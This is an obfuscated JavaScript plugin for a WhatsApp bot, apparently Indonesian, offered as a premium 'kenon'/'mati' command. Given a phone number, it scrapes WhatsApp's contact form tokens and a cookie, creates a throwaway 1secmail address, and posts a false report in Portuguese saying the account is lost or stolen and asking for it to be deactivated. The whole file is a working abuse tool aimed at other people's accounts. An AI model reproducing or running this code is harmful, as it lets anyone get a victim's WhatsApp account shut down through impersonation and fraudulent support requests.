import axioss from 'axios'
import cheerio from'cheerio'
import util from'util'
let handler = async (
  _0x15bce5,
  {
    conn: _0x262e26,
    command: _0x110ae2,
    usedPrefix: _0x6eaddf,
    text: _0x5b38b9,
  }
) => {
  if (!_0x5b38b9) {
    throw 'Masukan Nomor'
  }
  let _0x526fde = await axioss.get(
      'https://www.whatsapp.com/contact/noclient/'
    ),
    _0x480ad4 = await axioss.get(
      'https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10'
    ),
    _0x24439a = _0x526fde.headers['set-cookie'].join('; '),
    _0x2d2780 = cheerio.load(_0x526fde.data),
    _0x56035f = _0x2d2780('form'),
    _0x2df07c = new URL(_0x56035f.attr('action'), 'https://www.whatsapp.com')
      .href,
    _0x1b5b2d = new URLSearchParams()
  _0x1b5b2d.append('jazoest', _0x56035f.find('input[name=jazoest]').val())
  _0x1b5b2d.append('lsd', _0x56035f.find('input[name=lsd]').val())
  _0x1b5b2d.append('step', 'submit')
  _0x1b5b2d.append('country_selector', 'ID')
  _0x1b5b2d.append('phone_number', _0x5b38b9)
  _0x1b5b2d.append('email', _0x480ad4.data[0])
  _0x1b5b2d.append('email_confirm', _0x480ad4.data[0])
  _0x1b5b2d.append('platform', 'ANDROID')
  _0x1b5b2d.append('your_message', 'Perdido/roubado: desative minha conta')
  _0x1b5b2d.append('__user', '0')
  _0x1b5b2d.append('__a', '1')
  _0x1b5b2d.append('__csr', '')
  _0x1b5b2d.append('__req', '8')
  _0x1b5b2d.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0')
  _0x1b5b2d.append('dpr', '1')
  _0x1b5b2d.append('__ccg', 'UNKNOWN')
  _0x1b5b2d.append('__rev', '1006630858')
  _0x1b5b2d.append('__comment_req', '0')
  let _0x5b023c = await axioss({
    url: _0x2df07c,
    method: 'POST',
    data: _0x1b5b2d,
    headers: { cookie: _0x24439a },
  })
  _0x262e26.reply(
    _0x15bce5.chat,
    util.format(JSON.parse(_0x5b023c.data.replace('for (;;);', ''))),
    _0x15bce5
  )
}
handler.help = ['kenon']
handler.tags = ['tools']
handler.command = /^kenon|mati$/i
handler.premium = true
export default handler
